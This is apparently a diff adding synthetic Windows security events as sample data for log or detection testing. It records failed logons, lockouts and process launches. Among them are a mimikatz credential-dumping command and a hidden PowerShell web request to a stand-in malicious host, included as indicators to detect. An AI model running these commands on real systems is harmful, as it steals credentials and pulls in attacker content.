@@ -1,0 +1,70 @@
+[
+    {
+        "EventID": 4625,
+        "TimeCreated": "2025-07-29T09:30:00Z",
+        "TargetUserName": "johndoe",
+        "IpAddress": "192.168.1.30",
+        "FailureReason": "Unknown user name or bad password"
+    },
+    {
+        "EventID": 4625,
+        "TimeCreated": "2025-07-29T09:35:20Z",
+        "TargetUserName": "admin",
+        "IpAddress": "10.0.0.5",
+        "FailureReason": "Account disabled"
+    },
+    {
+        "EventID": 4740,
+        "TimeCreated": "2025-07-29T09:40:00Z",
+        "TargetUserName": "johndoe",
+        "IpAddress": "192.168.1.30"
+    },
+    {
+        "EventID": 4740,
+        "TimeCreated": "2025-07-29T09:41:15Z",
+        "TargetUserName": "admin",
+        "IpAddress": "10.0.0.5"
+    },
+    {
+        "EventID": 4688,
+        "TimeCreated": "2025-07-29T09:50:00Z",
+        "TargetUserName": "SYSTEM",
+        "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "cmd.exe /c whoami"
+    },
+    {
+        "EventID": 4688,
+        "TimeCreated": "2025-07-29T09:55:00Z",
+        "TargetUserName": "administrator",
+        "NewProcessName": "C:\\Tools\\mimikatz.exe",
+        "CommandLine": "mimikatz.exe privilege::debug sekurlsa::logonpasswords"
+    },
+    {
+        "EventID": 4625,
+        "TimeCreated": "2025-07-29T10:00:00Z",
+        "TargetUserName": "guest",
+        "IpAddress": "203.0.113.5",
+        "FailureReason": "Unknown user name or bad password"
+    },
+    {
+        "EventID": 4688,
+        "TimeCreated": "2025-07-29T10:10:00Z",
+        "TargetUserName": "SYSTEM",
+        "NewProcessName": "C:\\Windows\\System32\\powershell.exe",
+        "CommandLine": "powershell.exe -nop -w hidden -c Invoke-WebRequest http://malicious.com"
+    },
+    {
+        "EventID": 4740,
+        "TimeCreated": "2025-07-29T10:15:00Z",
+        "TargetUserName": "guest",
+        "IpAddress": "203.0.113.5"
+    },
+    {
+        "EventID": 4625,
+        "TimeCreated": "2025-07-29T10:20:00Z",
+        "TargetUserName": "root",
+        "IpAddress": "192.168.1.99",
+        "FailureReason": "Account locked out"
+    }
+]
+
